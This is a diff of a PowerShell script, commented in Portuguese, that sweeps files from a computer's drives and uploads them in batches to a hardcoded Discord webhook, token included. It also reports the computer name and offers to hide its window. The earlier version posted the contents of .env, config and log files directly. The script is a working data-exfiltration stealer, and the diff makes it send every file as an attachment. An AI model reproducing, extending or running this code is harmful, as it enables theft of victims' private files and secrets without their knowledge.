@@ -1,8 +1,8 @@
 <#
 .SYNOPSIS
-    Coleta arquivos e envia para Discord via webhook.
+    Coleta arquivos e envia para Discord como anexos.
 .NOTES
-    Versao ASCII - sem acentos, cedilhas ou emojis.
+    Versao simplificada - todos os arquivos vao como anexos.
 #>
 
 $webhookUrl = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
@@ -25,11 +25,14 @@ function Send-DiscordMessage {
 function Send-FilesToDiscord {
     param([string]$FolderPath, [string]$WebhookUrl, [int]$MaxFiles = 10, [int]$MaxSizeBytes = 8MB)
     
+    # Pega todos os arquivos da pasta (limitados por tamanho)
     $files = Get-ChildItem -Path $FolderPath -File | Where-Object { $_.Length -le $MaxSizeBytes }
     if ($files.Count -eq 0) {
-        Write-Host "Nenhum arquivo valido." -ForegroundColor Yellow
+        Write-Host "Nenhum arquivo valido para enviar." -ForegroundColor Yellow
         return @{sent = 0; skipped = 0}
     }
+    
+    Write-Host "Encontrados $($files.Count) arquivos para envio." -ForegroundColor Cyan
     
     $sentCount = 0
     $skippedCount = 0
@@ -40,71 +43,62 @@ function Send-FilesToDiscord {
         $batch = $files | Select-Object -Skip $fileIndex -First $MaxFiles
         $fileIndex += $MaxFiles
         
-        Write-Host "Enviando lote $batchNumber..." -ForegroundColor Magenta
+        Write-Host "Preparando lote $batchNumber ($($batch.Count) arquivos)..." -ForegroundColor Magenta
         
-        $fileList = ($batch | ForEach-Object { "- $($_.Name) ($([math]::Round($_.Length / 1KB, 1)) KB)" }) -join "`n"
-        $headerMessage = @{ content = "[Lote $batchNumber] Pasta: $FolderPath`nArquivos:`n$fileList" } | ConvertTo-Json
-        try {
-            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $headerMessage -ContentType 'application/json'
-            Start-Sleep -Milliseconds 300
-        } catch {
-            Write-Host "Erro no cabecalho do lote." -ForegroundColor Red
+        # Constroi a lista de arquivos com suas pastas de origem
+        $fileList = @()
+        foreach ($f in $batch) {
+            $pastaOrigem = Split-Path $f.FullName -Parent
+            $fileList += "- $($f.Name) (Origem: $pastaOrigem)"
         }
+        $listaMsg = $fileList -join "`n"
         
+        # Mensagem que vai junto com os anexos
+        $contentMsg = "[Lote $batchNumber]`nArquivos anexados:`n$listaMsg"
+        
+        # Prepara o boundary para multipart
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        # Inicia o corpo da requisicao com a mensagem JSON
+        $bodyLines = @(
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"payload_json`"$LF",
+            "{`"content`": `"$contentMsg`"}"
+        )
+        
+        # Adiciona cada arquivo como anexo
         foreach ($file in $batch) {
             try {
-                if ($file.Length -gt $MaxSizeBytes) {
-                    Write-Host "Arquivo grande: $($file.Name)" -ForegroundColor Yellow
-                    $skippedCount++
-                    continue
-                }
-                
-                if ($file.Length -lt 2000 -and ($file.Extension -in '.txt','.log','.json','.cfg','.conf','.xml','.ini','.yaml','.config','.env','.csv','.forms')) {
-                    $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
-                    if ($content) {
-                        if ($content.Length -gt 1900) {
-                            $content = $content.Substring(0, 1900) + "..."
-                        }
-                        $msg = "Arquivo: $($file.Name)`n```$content```"
-                        $body = @{ content = $msg } | ConvertTo-Json
-                        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
-                        Write-Host "Enviado (texto): $($file.Name)" -ForegroundColor Green
-                        $sentCount++
-                        Start-Sleep -Milliseconds 200
-                        continue
-                    }
-                }
-                
-                $boundary = [System.Guid]::NewGuid().ToString()
-                $LF = "`r`n"
                 $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                 $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
-                $fileSizeKB = [math]::Round($file.Length / 1KB, 1)
-                $contentText = "Anexo: $($file.Name) ($fileSizeKB KB)"
                 
-                $bodyLines = @(
-                    "--$boundary",
-                    "Content-Disposition: form-data; name=`"payload_json`"$LF",
-                    "{`"content`": `"$contentText`"}",
-                    "--$boundary",
-                    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
-                    "Content-Type: application/octet-stream$LF",
-                    $fileContent,
-                    "--$boundary--$LF"
-                ) -join $LF
-                
-                Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-                Write-Host "Enviado (anexo): $($file.Name)" -ForegroundColor Green
-                $sentCount++
-                Start-Sleep -Milliseconds 500
+                $bodyLines += "--$boundary"
+                $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`""
+                $bodyLines += "Content-Type: application/octet-stream$LF"
+                $bodyLines += $fileContent
             } catch {
-                Write-Host "Erro ao enviar $($file.Name)" -ForegroundColor Red
+                Write-Host "Erro ao ler arquivo: $($file.Name)" -ForegroundColor Red
                 $skippedCount++
             }
         }
         
+        $bodyLines += "--$boundary--$LF"
+        $body = $bodyLines -join $LF
+        
+        # Envia o lote
+        try {
+            Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $body
+            Write-Host "Lote $batchNumber enviado com $($batch.Count) anexos." -ForegroundColor Green
+            $sentCount += $batch.Count - $skippedCount
+            Start-Sleep -Milliseconds 500
+        } catch {
+            Write-Host "Erro ao enviar lote $batchNumber: $_" -ForegroundColor Red
+        }
+        
         $batchNumber++
         if ($fileIndex -lt $files.Count) {
+            Write-Host "Aguardando 2 segundos..." -ForegroundColor Gray
             Start-Sleep -Seconds 2
         }
     }
@@ -180,7 +174,7 @@ if (-not (Test-Path $destinationPath)) {
     Write-Host "Pasta: $destinationPath" -ForegroundColor Green
 }
 
-# Hide-Window  # Descomente se quiser ocultar a janela
+# Hide-Window  # Descomente se quiser ocultar
 
 $driveIndex = 0
 $collectedFiles = @()
@@ -239,10 +233,10 @@ if ($skippedLargeFiles -gt 0) {
 }
 
 if ($collectedFiles.Count -gt 0) {
-    Write-Host "Enviando para Discord..." -ForegroundColor Cyan
+    Write-Host "Enviando para Discord como anexos..." -ForegroundColor Cyan
     $result = Send-FilesToDiscord -FolderPath $destinationPath -WebhookUrl $webhookUrl -MaxFiles $maxFilesPerBatch -MaxSizeBytes $maxFileSizeBytes
     
-    $summaryMessage = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados: $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME Usuario: $env:USERNAME Finalizado: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
+    $summaryMessage = "[Coleta Concluida] Pasta: $destinationPath Total: $totalFilesFound Coletados: $($collectedFiles.Count) Enviados: $($result.sent) Ignorados: $($result.skipped + $skippedLargeFiles) Computador: $env:COMPUTERNAME"
     Send-DiscordMessage -Message $summaryMessage -WebhookUrl $webhookUrl
     
     $endMessage = "[Sistema Finalizado] Todos os lotes enviados. Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
